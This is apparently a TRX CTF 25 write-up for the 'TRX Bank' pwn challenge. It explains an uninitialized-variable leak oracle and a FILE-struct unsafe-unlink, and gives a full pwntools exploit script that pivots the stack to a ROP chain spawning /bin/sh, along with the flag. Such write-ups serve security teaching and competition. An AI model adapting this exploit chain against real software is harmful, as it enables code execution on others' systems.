---
title: TRX CTF 25 - TRX Bank
date: '2025-02-26'
lastmod: '2025-02-26T15:00:00+02:00'
categories:
- writeup
- trxctf25
tags:
- pwn
- file struct
authors:
- Erge
---

## Description

To all our Valued Customers, at TRX Bank we aim to provide only the top-notch banking and customer experience;\
all reports about so-called "data leaks" are baseless slander from our competitors.

**DISCLAIMER**: Please test your solve locally before spawning a remote instance of the challenge!

## Overview of the challenge

The challenge allows us to create/delete bank accounts and make transfers/deposits,
there's also a `secret_backdoor` function, which we can access only after successfully leaking pie, which allows us to overwrite part of the `fp_rand` file struct used to create random IBANs
## Solution

The first step to solving the challenge is noticing a missing check in the `transfer` function, we can make the `scanf` call that asks the transfer amount fail, allowing us to use the uninitialized variable as an oracle, we can then binary search that value against our account balance.\
This allows us to leak pie/heap/libc/stack by making the binary reach different functions before transferring (see [solve.py](solve/solve.py) for details)

The second step involves overwriting the `prev_chain` and `chain` fields of the file struct, allowing us to perform an `unsafe-unlink` to gain a limited `write-what` primitive, the catch is that both the write and the what must be writeable addresses\
One possible solution is to overwrite a saved `rbp` on the stack and pivot to a controlled location.

The last thing we need is a place to store our rop-chain, i opted for writing it to the heap by overwriting the `_fileno` to stdin and creating new IBANs

## Solve Script

```py
#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./chal_patched")
libc = ELF("./libc.so.6")

context.binary = exe

DOCKER_PORT = 3317
REMOTE_NC_CMD    = "nc bank.ctf.theromanxpl0.it 7010"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b *transfer+334
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    if args.DOCKER:
        return remote("localhost", DOCKER_PORT)
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    def malloc():
        r.sendline(b"2")
        r.recvuntil(b"your IBAN is ")
        ret = r.recv(31)
        r.recvuntil(b">")
        return ret

    def free(IBAN):
        r.sendline(b"3")
        r.recvuntil(b"Please enter your IBAN:")
        r.send(IBAN)
        r.recvuntil(b">")

    def deposit(IBAN, n):
        r.sendline(b"4")
        r.send(IBAN)
        r.sendline(bstr(n))
        r.recvuntil(b">")

    def transfer(src, dst, n):
        r.sendline(b"5")
        r.send(src)
        r.send(dst)
        r.sendline(n)
        r.recvuntil(b"How much do you want to transfer?\n")
        ret = r.recvline()
        r.recvuntil(b">")
        return ret

    def spray_heap(data=None):
        if data==None:
            r.send(b"AA")
            r.recvuntil(b">")
            return

        for i in range(0, len(data), 0x2):
            r.send(data[i:i+2])
            r.recvuntil(b">")

    def backdoor(addr, data=None):
        r.sendline(b"6")
        r.sendline(hex(addr).encode())
        r.send(data)
        r.recvuntil(b">")

    def binary_search(l, r, type=None):
        mid = (l+r)//2

        free(n[0])
        n[0] = malloc()
        deposit(n[0], mid)
        if type == "STACK":
            fp = FileStructure()
            fp.fileno = 3
            fp._lock = exe.bss(0x300)
            backdoor(exe.sym.secret_backdoor, bytes(fp)[0x60:0x60+0x77])
        elif type == "HEAP":
            n[0x1f] = malloc()
            free(n[0x1f])
        elif type == "LIBC":
            spray_heap()

        res = transfer(n[0], n[1], b"-")

        if l>=r:
            return mid
        elif b"insufficient" in res:
            l=mid+1
        elif b"completed" in res:
            r=mid-1
        return binary_search(l,r, type)

    '''
    USE UNINITIALIZED VARIABLE AS AN ORACLE TO LEAK PIE/HEAP/LIBC
    '''
    n = []
    for i in range(0x2):
        n.append(malloc())

    exe.address = binary_search(0, 2**48) - exe.sym.deposit - 225
    log.info(f"PIE @ {hex(exe.address)}")
    stack = binary_search(0, 2**48, "STACK")
    log.info(f"STACK @ {hex(stack)}")

    for i in range(0x1d):
        n.append(malloc())
    n.append(0)

    heap = binary_search(0, 2**48, "HEAP") - 0x1a30
    log.info(f"HEAP @ {hex(heap)}")

    libc.address = binary_search(0, 2**48, "LIBC") - libc.sym.puts - 474
    log.info(f"LIBC @ {hex(libc.address)}")

    '''
    UNSAFE UNLINK TO OVERWRITE SAVED RBP AND ROP
    '''

    fp = FileStructure()
    fp.fileno = 0
    fp._lock = exe.bss(0x300)
    fp.chain = heap+0x5a0 #our saved ropchain on the heap
    fp.unknown2 = p64(0)*2 + p64(stack-0x168) + p64(-1, signed=True) + p64(0) #prevchain and the saved rbp on the stack

    backdoor(exe.sym.secret_backdoor, bytes(fp)[0x60:0x60+0x77])

    rop2 = ROP(libc)
    rop2.rdi = libc.binsh()
    rop2.raw(rop2.ret.address)
    rop2.raw(libc.sym.system)

    rop = ROP(libc)
    rop.raw(b"A"*0xf8)
    rop.read(0, stack-0x200, len(rop2.chain()))
    rop.rsp = stack-0x200

    for i in range(11):
        free(malloc())
    r.sendline(b"2")
    r.send(b"\0"*15)
    r.recvuntil(b">", timeout=2)
    free(n[0])

    r.sendline(b"2")
    r.send((rop.chain()))
    #gdb.attach(r, gdbscript="b fclose\nb *leave+97\nc")
    fp = FileStructure()
    fp.fileno = 3
    fp._lock = exe.bss(0x300)
    fp.chain = heap+0x5a0 #our saved ropchain on the heap
    fp.unknown2 = p64(0)*2 + p64(stack-0x168) + p64(-1, signed=True) + p64(0) #prevchain and the saved rbp on the stack

    r.recvuntil(b">")
    backdoor(exe.sym.secret_backdoor, bytes(fp)[0x60:0x60+0x77])
    r.sendline(b"7")
    r.recvuntil(b"We're sorry ")
    r.send(rop2.chain())

    r.interactive()

if __name__ == "__main__":
    main()
```

## Flag

`TRX{un54f3_unl1nk_15_n07_f0r_7h3_h34p_0nly_a4b62c68}`
